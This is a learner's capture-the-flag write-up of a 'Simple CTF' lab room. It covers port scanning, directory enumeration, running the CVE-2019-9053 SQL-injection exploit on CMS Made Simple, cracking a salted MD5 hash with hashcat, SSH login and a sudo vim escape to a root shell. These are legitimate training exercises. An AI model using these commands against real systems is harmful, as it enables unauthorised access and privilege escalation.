The Room asks for services running under port 1000
so I run the command

2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)

## Attempt 1(Fail)
I then search for a CVE I can use on this machine on ExploitDB. I start with `Apache 2.4.18`, then `vsfttpd 3.0.3` but they yield no results. 

Finally, I tried `OpenSSH 7.2p2` and got a [Username Enumeration Exploit](#Exploit_1). However the CVE is not the correct answer so I tried something else.

## Attempt 2
Since the machine has a web server, I start by using GoBuster to enumerate 
directories.

`gobuster dir -u 10.48.163.39 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`

I also do 
`gobuster dir -u 10.48.163.39 -w /usr/share/wordlists/dirb/common.txt
to search for common files such as robot.txt

#### Results
```
/index.html
/robots.txt
/simple
```

`index.html` and `robots.txt` did not seem like they contain anything important.

`/simple` however contained the CMS made simple page

![](attachments/Pasted%20image%2020260215162008.png)

At the bottom of the page, the version is revealed, there might be a CVE that can be used on this web site manager.

![](attachments/Pasted%20image%2020260215162120.png)

Searching for `CMS made simple 2.2.8` on ExploitDB did not yield results but searching on google brought me back to an [ExploitDB page](#Exploit_2).

`CVE-2019-9053

with a `sqli` vulnerability

According to the exploit code, I should run

`python3 46635.py -u http://10.48.129.236/simple --crack -w /usr/share/wordlists/rockyou.txt`

![](attachments/Pasted%20image%2020260221144639.png)

seems like an error with rockyou.txt, I redownloaded it and ran the following command to ensure it is utf-8

````
iconv -f ISO-8859-1 -t UTF-8 rockyou.txt > rockyou_utf8.txt
````

now I run
`python3 46635.py -u http://10.48.129.236/simple --crack -w rockyou_utf8.txt`

I still kept getting errors so I just did it manually, I first identify the hash type.

From the results, I got `0c01f4468bd75d7a84c7eb73846e8d96`
**NOTE: $ is a separator, separating hash from salt**
and the salt `1dac0d92e9fa6bb2`

The full hash will be something like this
`0c01f4468bd75d7a84c7eb73846e8d96$1dac0d92e9fa6bb2`

Using [Hashes.com](#Hashes.com), I got MD5.

![](attachments/Pasted%20image%2020260221153123.png)

Now, I use hashcat to crack the hash.

I create `.txt` file with the following full hash, changing the `$` to `:`
`0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2`

and use it on hashcat with `rockyou.txt`

According to [Hashcat](#Hashcat), the `Hash-Mode` is 10.

I then run `hashcat -a 0 -m 10 Documents/SimpleCTF_hash.txt /usr/share/wordlists/rockyou.txt`

I could not crack it even after exhausting the rockyou.txt using `-m 10`, however, according to [hughbrown123](#hughbrown123), the correct mode was 20.

I do not know why this is the case.

using `hashcat -a 0 -m 20 Documents/SimpleCTF_hash.txt /usr/share/wordlists/rockyou.txt`, I successfully retrieved the password.

`secret`

![](attachments/Pasted%20image%2020260221155845.png)

Using the username I found, `mitch`, and the password `secret`

I try logging in over SSH.

**Note: Remember to append -p 2222 as the ssh server is located at port 2222**

`ssh mitch@10.49.162.11 -p 2222` 

![](attachments/Pasted%20image%2020260223165803.png)

Using `sudo -l`, I found that the user mitch can run vim as root.

![](attachments/Pasted%20image%2020260223165900.png)

Searching for this at [Gtfobins](#Gtfobins), I found an command that can be run. 

````
vim -c ':py import os; os.execl("/bin/sh", "sh")'
````


However this did not work for me.

I instead use the following

```
sudo vim -c ':py3 import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```

and successfully got a root shell.

![](attachments/Pasted%20image%2020260223172602.png)

# Conclusion
This was a really hard room for me as I kept hitting walls on my knowledge, I could not get the exploit to work as intended and had to get the password manually from a hash.
However, I learned how to use Hashcat throughout the problem solving process.

I also learned that I should append -sV to my nmap scan to get more information than what I could get before.
